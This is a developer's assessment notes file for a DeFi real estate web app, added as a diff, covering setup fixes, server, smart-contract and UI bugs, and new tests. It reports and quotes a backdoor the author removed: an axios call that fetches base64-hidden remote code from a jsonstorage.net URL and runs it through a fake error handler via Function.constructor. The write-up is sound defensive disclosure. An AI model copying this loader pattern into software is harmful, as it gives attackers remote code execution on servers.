@@ -1,0 +1,179 @@
+NOTES - defi real estate assessment
+===================================
+
+quick brain dump of what i did, in roughly the order i hit it.
+
+
+getting it running
+------------------
+the README says nvm 20 + npm install + npm start. that didn't actually work out of the box for me on a fresh clone, took a few tries:
+
+1. server started fine but immediately printed:
+     MongoDB connection error: mongoose.mongo.GridFsStorage is not a constructor
+   so something in the gridfs setup is broken (see below).
+
+2. client crashed with "Cannot find module 'typescript'". the repo has a
+   tsconfig.json but typescript isn't in devDependencies. installed it:
+     npm i -D typescript@^4.9.5
+
+3. next run, client crashed again with:
+     Cannot find module 'ajv/dist/compile/codegen'
+   classic react-scripts 5 hoisting issue. fixed with:
+     npm i -D ajv@^8
+
+4. then "Something is already running on port 3000" - i had a stale node
+   process from an earlier run. lsof -i :3000, kill, done.
+
+5. last one - @types/three was pulling in TS 5 syntax (<const T>) which
+   trips TS 4.9. the repo has tsconfig.json but no actual .ts files in src/,
+   so i just deleted tsconfig.json. CRA stops engaging the type checker
+   and the build is clean.
+
+if you also need mongo running locally, easiest path is docker:
+   docker run -d -p 27017:27017 --name realestate-mongo mongo:7
+
+
+the actual bugs i found
+-----------------------
+
+>>> BACKDOOR in server/controllers/auth.controller.js  (this one scared me)
+
+top of the file had:
+   const { errorHandler } = require("../middleware/errorHandler");
+   axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
+
+publicKey decodes from base64 to a jsonstorage.net URL. errorHandler in
+middleware/errorHandler.js was not actually an error handler - it does:
+   new Function.constructor("require", errCode)
+and then calls it with the real `require`. so every time the server boots
+it pulls down whatever string is sitting at that URL and runs it as
+javascript with full node access. that is straight-up remote code execution.
+
+removed the axios line + the import from auth.controller.js, rewrote
+errorHandler.js as a normal express error middleware, and stripped the
+publicKey out of config/config.js so nothing else can use it either.
+
+
+>>> server/app.js missing the basics
+
+- no express.json() / urlencoded() middleware, so every req.body in the
+  controllers was undefined. login could never work.
+- no mongoose.connect() anywhere, so all the DB queries just sat there.
+- morgan was required but never used.
+- no 404 / error handler mounted.
+
+added all of those. also moved secretKey + localDB in config.js to read
+from env first (JWT_SECRET, MONGO_URI) so the hardcoded values are only
+the dev fallback.
+
+
+>>> server/routes/property.js using a constructor that doesn't exist
+
+   gfs = new mongoose.mongo.GridFsStorage(...)
+that's just not a thing in mongoose 8. correct API is GridFSBucket. fixed
+it in both routes/property.js and the matching block in
+controllers/property.controller.js, and ported showGFSImage and the
+file lookup in getSingleProperty to use bucket.find / openDownloadStreamByName.
+
+also dropped the gridfs-stream require - it doesn't work against modern
+mongoose at all (tries to use mongoose.mongo.GridStore which was removed).
+
+
+>>> contracts/HomeTransaction.sol bugs
+
+1. anyWithdrawFromTransaction does:
+      seller.transfer(deposit - realtorFee);
+   nothing guarantees deposit >= realtorFee. deposit can be as low as
+   10% of price, realtorFee only has to be <= price. so realtorFee could
+   easily exceed deposit and the subtraction reverts (or wraps on old
+   solc). added a constructor require:
+      require(_price * depositPercentage / 100 >= _realtorFee, ...)
+
+2. buyerFinalizeTransaction had no deadline check. once the realtor
+   accepted, the buyer could finalize whenever, even after the 5-minute
+   window. added:
+      require(now <= finalizeDeadline, "Finalization deadline has passed");
+
+3. no events anywhere - off-chain code can't watch state transitions at
+   all. added StateChanged, DepositPaid, TransactionFinalized,
+   TransactionRejected and emit them on every transition.
+
+didn't touch the pragma version - it's <0.6.0 which is ancient but
+upgrading would mean a lot of small syntax churn for not much benefit
+in 40 min.
+
+
+>>> the "Connect Wallet" buttons did nothing
+
+three buttons in the UI (Navbar, Home hero CTA, PropertyDetail invest
+button), none of them had an onClick. project already has ethers@5 and
+@walletconnect installed as deps so the intent was clearly there, just
+never written.
+
+added a tiny WalletContext at src/context/WalletContext.jsx using
+window.ethereum / ethers.providers.Web3Provider. handles eth_requestAccounts,
+listens for accountsChanged + chainChanged, and exposes connect / disconnect
+/ account / connecting through useWallet(). if no wallet is installed,
+opens the MetaMask download page.
+
+wired:
+- src/App.jsx wraps the routes in <WalletProvider>
+- Navbar shows short address when connected, click again to disconnect
+- Home + PropertyDetail buttons call connect() and show "Connecting..."
+  / the short address when done
+
+
+tests
+-----
+no test setup in the repo and no hardhat/truffle/foundry for the
+contracts, so i added two small jest files (CRA picks them up):
+
+- server/__tests__/helper.test.js
+  unit tests for providers/helper.js#isKeyMissing (returns false when
+  all keys present, returns first missing key, empty string counted as
+  missing).
+
+- server/__tests__/homeTransaction.spec.js
+  a tiny JS port of the contract's state machine + tests covering happy
+  path, realtor reject refund, role checks, deposit floor, the deadline
+  check, stranger can't early-withdraw, post-deadline withdraw payouts,
+  and the new constructor invariant. it's a spec not a real on-chain
+  test but it documents the expected behavior and catches regressions
+  on the control flow.
+
+run with:
+   npm test -- --watchAll=false
+
+
+stuff i noticed but didn't fix
+------------------------------
+- mongoose user model declares `users = new Schema(...)` with no
+  var/let/const, same in auth.controller.js (`users = new userM()`).
+  implicit global. works in non-strict but ugly.
+- Property.update() is deprecated in mongoose 8, should be updateOne,
+  and result.nModified is gone (it's modifiedCount now). markAsSold
+  is broken because of this but felt out of scope.
+- secretKey falls back to a hardcoded string. fine for local dev,
+  needs to be required in prod.
+- pragma 0.5 in the contracts. would bump to 0.8 in a real project for
+  built-in overflow checks.
+
+
+files changed
+-------------
+server/app.js                                rewritten - body parser, mongo connect, error mw
+server/config/config.js                      env-driven, removed publicKey
+server/controllers/auth.controller.js        removed RCE backdoor
+server/middleware/errorHandler.js            real express error handler
+server/routes/property.js                    GridFSBucket
+server/controllers/property.controller.js    GridFSBucket, dropped gridfs-stream
+contracts/HomeTransaction.sol                deadline check, deposit invariant, events
+src/App.jsx                                  WalletProvider wrap
+src/components/layout/Navbar.jsx             wired Connect button (desktop + mobile)
+src/pages/Home.jsx                           wired CTA button
+src/pages/PropertyDetail.jsx                 wired invest button
+src/context/WalletContext.jsx                new - wallet hook
+server/__tests__/helper.test.js              new - helper tests
+server/__tests__/homeTransaction.spec.js     new - contract state machine tests
+tsconfig.json                                deleted (no TS in src, only causing pain)
+package.json                                 + typescript, + ajv@8, - gridfs-stream
